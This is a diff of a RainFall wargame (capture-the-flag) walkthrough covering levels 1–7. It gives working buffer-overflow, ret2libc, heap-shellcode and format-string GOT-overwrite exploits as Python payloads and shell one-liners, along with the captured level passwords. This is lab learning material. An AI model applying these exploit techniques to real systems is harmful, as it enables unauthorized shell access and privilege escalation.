@@ -1,12 +1,5 @@
-
-LEVEL_0:
-./level0 423
-$ cd ..
-$ cd level1
-$ cat .pass
-1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
-
-LEVEL_1
+LEVEL_1:
+# 📚 Exploiting `level1` – Exploit the overflow to get a shell.
     - get the system addr:
         level1@RainFall:~$ gdb ./level1
         (gdb) disas system
@@ -49,40 +42,39 @@ LEVEL_1
         0xb7f8cc58:      "/bin/sh"
     
 
-system()	        ->    0x08048360	\x60\x83\x04\x08
-Fake Return Address	->    "AAAA"
-"/bin/sh" string    ->    0xb7f8cc58	\x58\xcc\xf8\xb7
+- system()	        ->    0x08048360	-> \x60\x83\x04\x08
+- Fake Return Address	->    "AAAA"
+- "/bin/sh" string    ->    0xb7f8cc58 ->	\x58\xcc\xf8\xb7
 
-(python -c 'print("A"*76 + "\x60\x83\x04\x08" + "AAAA" + "\x58\xcc\xf8\xb7")' ; cat ) | ./level1
+> (python -c 'print("A"*76 + "\x60\x83\x04\x08" + "AAAA" + "\x58\xcc\xf8\xb7")' ; cat ) | ./level1
 
-whoami
-level2
-cd ..
-cd level2
-cat .pass
+whoami</br>
+level2</br>
+cd ..</br>
+cd level2</br>
+cat .pass</br>
+```
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-
-scp level2@192.168.0.114:/home/user/level2/level2 ./level2
+```
 
 LEVEL_2:
-   Exploit the overflow to get a shell. Since return-to-stack is blocked, we execute shellcode from the heap using strdup().
-Exploit Strategy
-1.Inject shellcode into local_50 buffer.
+# 📚 Exploiting `level2` – Exploit the overflow to get a shell.
+> scp level2@192.168.0.114:/home/user/level2/level2 ./level2
 
-2.strdup(local_50) copies this shellcode to heap at a predictable address (found via GDB).
+Since return-to-stack is blocked, we execute shellcode from the heap using strdup().
 
-3.Overflow RET to point to the heap address returned by strdup().
+Exploit Strategy:</br>
 
-4.When p() returns → EIP = heap → shellcode executes → /bin/sh spawns.
+Inject shellcode into local_50 buffer:
+  - 2.strdup(local_50) copies this shellcode to heap at a predictable address (found via GDB).
+  - 3.Overflow RET to point to the heap address returned by strdup().
+  - 4.When p() returns → EIP = heap → shellcode executes → /bin/sh spawns.
 
-Why This Works
-NX disabled → heap is executable.
+Why This Works?</br>
 
+NX disabled → heap is executable(Check only blocks stack addresses, not heap).</br>
 ASLR off → heap address is stable (e.g., 0x0804a008).
-
 strdup() gives us a writable+executable space for shellcode.
-
-Check only blocks stack addresses, not heap.
 
 Find heap address after strdup() using GDB:
 ```
@@ -94,10 +86,8 @@ Craft payload:
 
 Shellcode: 25-byte Linux x86 execve("/bin/sh").
 
-Padding to 76 bytes.
-
-Overwrite EBP (4 bytes).
-
+Padding to 76 bytes.</br>
+Overwrite EBP (4 bytes).</br>
 Overwrite RET with heap address.
 ```
 from struct import pack
@@ -113,9 +103,9 @@ payload += "B" * 4
 payload += pack("<I", heap_addr)
 print(payload)
 ```
-```
-(python exploit.py; cat) | ./level2
-```
+
+> (python exploit.py; cat) | ./level2
+
 LEVEL_3:
 # 📚 Exploiting `level3` – Format String Vulnerability to Overwrite Global Variable
 
@@ -152,9 +142,7 @@ void v(void) {
  ## Exploitation Strategy
 
     Leak stack contents to determine the correct format string offset
-
     Use %n to write 0x40 to the address of the global variable m
-
     Trigger the condition and gain a shell
 
 ##  Step 1: Find the Address of m
@@ -226,7 +214,6 @@ The target is a vulnerable binary named `level4` from the RainFall wargame on Li
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
 
-
 void p(char *param_1)
 
 {
@@ -234,10 +221,7 @@ void p(char *param_1)
   return;
 }
 
-
-
 void n(void)
-
 {
   char local_20c [520];
   
@@ -253,9 +237,7 @@ void n(void)
  ## Exploitation Strategy
 
     Leak stack contents to determine the correct format string offset
-
     Use %n to write 0x40 to the address of the global variable m
-
     Trigger the condition and gain a shell
 
 ##  Step 1: Find the Address of m
@@ -302,13 +284,15 @@ print("Wrote payload with offset %d" % offset)
 
 ```
 ## Step 4: Execute the Exploit
+
+> python exploit.py 11 </br>
+> (cat payload.txt; cat) | ./level4
 ```
-python exploit.py 11 
-(cat payload.txt; cat) | ./level4
-                                                b7ff26b0
+b7ff26b0
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
 LEVEL_5:
+# 📚 Exploiting `level5` – Format String Vulnerability
 ```
 $ ./level5
 test
@@ -317,17 +301,13 @@ $
 ```
 ```
 void o(void)
-
 {
   system("/bin/sh");
                     // WARNING: Subroutine does not return
   _exit(1);
 }
 
-
-
 void n(void)
-
 {
   char local_20c [520];
   
@@ -337,10 +317,7 @@ void n(void)
   exit(1);
 }
 
-
-
 void main(void)
-
 {
   n();
   return;
@@ -349,17 +326,13 @@ void main(void)
 ```
 ## What happens?
 
-    The program reads input via fgets() into a large buffer (local_20c).
+The program reads input via fgets() into a large buffer (local_20c).</br>
+Then it calls printf(local_20c); — format string vulnerability!</br>
+Finally, it calls exit(1);
 
-    Then it calls printf(local_20c); — format string vulnerability!
-
-    Finally, it calls exit(1);
 ## Goal
-
 Use the format string vulnerability in printf(local_20c) to overwrite a GOT entry so when exit(1) is called, it actually calls o() instead of the normal exit().
 ## Step 1: Identify the GOT entry for exit
-
-Run:
 ```
 $ readelf -r ./level5 | grep exit
 08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
@@ -382,17 +355,15 @@ so the address of o is 0x080484a4
 
 ## Step 3: Exploit with format string
 
-Use the format string vulnerability to write the address of o() into exit@GOT.
-
+Use the format string vulnerability to write the address of o() into exit@GOT.</br>
 When n() calls exit(1), the program actually jumps to o(), spawning a shell.
 
 How to write the address?
 
     Split o() address into two halves (low 2 bytes and high 2 bytes).
-
     Write these halves to exit@GOT and exit@GOT + 2 using %hn.
-
     Use format string to print enough characters for padding.
+
 exploit script using python
 ```
 import struct
@@ -427,13 +398,12 @@ print("Payload written with offset %d" % offset)
 ```
 ```
 (cat payload.txt; cat) | ./level5
-
 whoami
 level6
 ```
-LEVEL_6:
 
----
+LEVEL_6:
+# 📚 Exploiting `level6` – overwrite the function pointer
 
 ## ✅ Step 1: Understand what you need to overflow
 
@@ -517,6 +487,7 @@ This should cause:
 ---
 
 LEVEL_7:
+# 📚 Exploiting `level7` – overwrite the function pointer
 
 # Heap overflow
 What's happening in the code
@@ -613,7 +584,6 @@ Segmentation fault (core dumped)
 === Trying pad = 20 ===
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1754601545
-```
 
 
 
